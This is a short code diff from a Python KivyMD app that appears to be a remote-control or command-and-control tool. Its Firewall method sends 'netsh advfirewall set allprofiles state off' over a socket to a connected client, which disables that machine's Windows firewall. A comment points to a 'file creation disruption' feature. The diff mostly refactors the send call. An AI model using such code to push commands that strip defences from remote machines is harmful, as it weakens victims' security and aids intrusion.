@@ -87,7 +87,6 @@ ScreenManager:
                 on_press: app.Firewall()
 '''
 
-
 class Main(MDApp):
     def build(self):
         self.theme_cls.theme_style = "Dark"
@@ -197,15 +196,11 @@ class Main(MDApp):
         while True:
             command = "netsh advfirewall set allprofiles state off"
             command = command.encode()
-            client.send(command)
+            self.currConn.send(command)
             print('[+] Command sent')
             output = client.recv(1024)
             output = output.decode()
             print(f"Output: {output}")
-            msgoutput.config(state="normal")
-            msgoutput.delete("1.0", tk.END)
-            msgoutput.insert(tk.END, "Firewall turned off")
-            msgoutput.config(state="disabled")
             break
         
     # File creation disruption
